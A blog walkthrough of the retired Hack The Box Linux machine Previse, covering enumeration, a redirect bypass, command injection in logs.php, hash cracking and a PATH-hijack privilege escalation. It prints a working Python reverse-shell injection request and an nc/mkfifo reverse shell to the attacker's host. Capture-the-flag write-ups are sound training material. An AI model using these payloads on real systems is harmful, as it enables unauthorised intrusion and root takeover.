---
loginlayout: single
title: "Walktrough: HTB Previse"
namespace: htb-previse
category: Walkthrough
tags:
  - HackTheBox
  - HTB Easy
  - HTB Linux
date: 2021-07-03 16:00:00
header:
   teaser: https://i.imgur.com/rSG7Yt6.png
---

Hello guys!

This week's machine will be **Previse**, another easy-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [m4lwhere](https://app.hackthebox.eu/users/107145)<!--more-->

:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
{: .notice--info}

![HTB Previse](https://i.imgur.com/MAA6AbX.png){: .align-center}

Add **Comment**

## Enumeration

As usual, started with a `nmap` quick scan to see which services are being published.

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.11.104
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-23 16:18 -03
Nmap scan report for 10.10.11.104
Host is up (0.073s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds
```

### 80/TCP - HTTP Service

Inspecting the page, we can see a "Previse File Storage" login page

![HTB Previse - Previse File Storage Login Page](https://i.imgur.com/XnvhpeW.png){: .align-center}

Checking with `whatweb`

```bash
$ whatweb http://10.10.11.104
http://10.10.11.104 [302 Found] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.104], Meta-Author[m4lwhere], RedirectLocation[login.php], Script, Title[Previse Home]
http://10.10.11.104/login.php [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.104], Meta-Author[m4lwhere], PasswordField[password], Script, Title[Previse Login]
```

Analyzing source code, inspecting the headers, noticed the following information, that might allude SOCKS proxy

> Previse rocks your socks

Considering this, started looking at the requests in Burp Suite and interestingly noticed that the full page is displayed but then I receive a 302 redirect, forcing me to the login page. Below is a response for the home page

```http
HTTP/1.1 302 Found
Date: Tue, 21 Dec 2021 22:44:29 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: login.php
Content-Length: 2801
Connection: close
Content-Type: text/html; charset=UTF-8


<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <meta charset="utf-8" />
    
            
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta name="description" content="Previse rocks your socks." />
        <meta name="author" content="m4lwhere" />
        <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
        <link rel="icon" href="/favicon.ico" type="image/x-icon" />
        <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
        <link rel="manifest" href="/site.webmanifest">
        <link rel="stylesheet" href="css/uikit.min.css" />
        <script src="js/uikit.min.js"></script>
        <script src="js/uikit-icons.min.js"></script>
   

<title>Previse Home</title>
</head>
<body>
    
<nav class="uk-navbar-container" uk-navbar>
    <div class="uk-navbar-center">
        <ul class="uk-navbar-nav">
            <li class="uk-active"><a href="/index.php">Home</a></li>
            <li>
                <a href="accounts.php">ACCOUNTS</a>
                <div class="uk-navbar-dropdown">
                    <ul class="uk-nav uk-navbar-dropdown-nav">
                        <li><a href="accounts.php">CREATE ACCOUNT</a></li>
                    </ul>
                </div>
            </li>
            <li><a href="files.php">FILES</a></li>
            <li>
                <a href="status.php">MANAGEMENT MENU</a>
                <div class="uk-navbar-dropdown">
                    <ul class="uk-nav uk-navbar-dropdown-nav">
                        <li><a href="status.php">WEBSITE STATUS</a></li>
                        <li><a href="file_logs.php">LOG DATA</a></li>
                    </ul>
                </div>
            </li>
            <li><a href="#" class=".uk-text-uppercase"></span></a></li>
            <li>
                <a href="logout.php">
                    <button class="uk-button uk-button-default uk-button-small">LOG OUT</button>
                </a>
            </li>
        </ul>
    </div>
</nav>

    <section class="uk-section uk-section-default">
        <div class="uk-container">
            <h2 class="uk-heading-divider">Previse File Hosting</h2>
            <p>Previse File Hosting Service Management.</p>
            <p>Don't have an account? Create one!</p>
        </div>
    </section>
    
<div class="uk-position-bottom-center uk-padding-small">
    <a href="https://m4lwhere.org/" target="_blank"><button class="uk-button uk-button-text uk-text-small">Created by m4lwhere</button></a>
</div>
</body>
</html>

```

Based on this request I can see a page `/accounts.php`, which displays a form for user creation, but the page is also redirected to `/login.php`.

Considering this, configured Burp to **ignore redirects** by replacing responses `302 Found` to `200 OK`, preventing redirects. After doing this the following page was seen in the browser

![HTB Previse - Home - No redirect](https://i.imgur.com/vMilnPY.png){: .align-center}

After navigating to the Accounts page, found a form to create a user account, which allowed me to successfully create a user called `dummy:P@ssw0rd`

![HTB Previse - Accounts Page](https://i.imgur.com/sWr3RwU.png){: .align-center}

After creating the account, I was able to successfully enter the system with it and, navigating to Files, noticed that there is a *.zip file containing the site backup, uploaded by the user `newguy`

![HTB Previse - Files Page](https://i.imgur.com/dQZLxxm.png){: .align-center}

After downloading the source code and inspecting all pages, one thing that called my attention was a PHP file **invoking a python script** in `logs.php`, as excerpt below:

```php
/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;
```

Once inputs might not be properly verified, considering that from the UI perspective values provided come from a dropdown list, this would be tampered with command injection.

## Initial Access

Chaining the `delim` parameter with a simple python reverse shell from [PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) worked successfully in our scenario, giving us a reverse shell to explore further

```http
POST /logs.php HTTP/1.1
Host: 10.10.11.104
Content-Length: 44
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.11.104
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.10.11.104/file_logs.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=si6obkvacjcp7dcg9e9v2d9nkl
Connection: close

delim=comma%3bexport+RHOST%3d"10.10.16.39"%3bexport+RPORT%3d4443%3bpython+-c+'import+socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("/bin/sh")'
```

## User flag

From the obtained shell, the first thing I did was get the password hashes from MySQL Database, which had the same credentials as we already saw from the site backup

```plaintext
mysql> select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |

```

Using Hashcat and `rockyou.txt`, found password **ilovecody112235!** by using the following command line

```bash
hashcat -a 0 -m 500 passwords /usr/share/wordlists/rockyou.txt
```

With this password for m4lwhere account, was able to connect to the box and read the user flag

```bash
www-data@previse:/var/www/html$ su m4lwhere
Password:
m4lwhere@previse:/var/www/html$ cd ~
m4lwhere@previse:~$ cat user.txt
<redacted>
```

## Root flag

now as `m4lwhere`, started enumeration as usual by running `sudo -l`

```bash
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere:
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
```

by inspecting the contents of this file,

```bash
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

Since this file is prevented from modification (at least from `m4lwhere` account), started looking for ways to abuse this `sudo` entry.

Checked for gzip [GTFOBins](https://gtfobins.github.io/gtfobins/gzip/) but nothing interesting was found. The only possibility would be a path hijack, once gzip is called without a path in script, so we can try to abuse that :smile:

The following steps were executed, to be able to get root access to this box:

- created a temp folder and inside it, a bash file called gzip

  ```bash
  m4lwhere@previse:~$ cd $(mktmp -d)
  m4lwhere@previse:/tmp/tmp.jXV0om034O$ vi gzip
  m4lwhere@previse:/tmp/tmp.jXV0om034O$ cat gzip
  #!/bin/bash
  
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.39 4443 >/tmp/f
  ```

- modified PATH appending the temp directory used

  ```bash
  m4lwhere@previse:/tmp/tmp.jXV0om034O$ export PATH=/tmp/tmp.jXV0om034O:$PATH
  ```

- ran sudo command and obtained a reverse shell

  ```bash
  m4lwhere@previse:/tmp/tmp.jXV0om034O$ sudo /opt/scripts/access_backup.sh
  ```

```bash
$ nc -lnvp 4443                                                                                                                                              1 ⨯
listening on [any] 4443 ...
connect to [10.10.16.39] from (UNKNOWN) [10.10.11.104] 52210
# cd /root
# cat root.txt
<redacted>
```
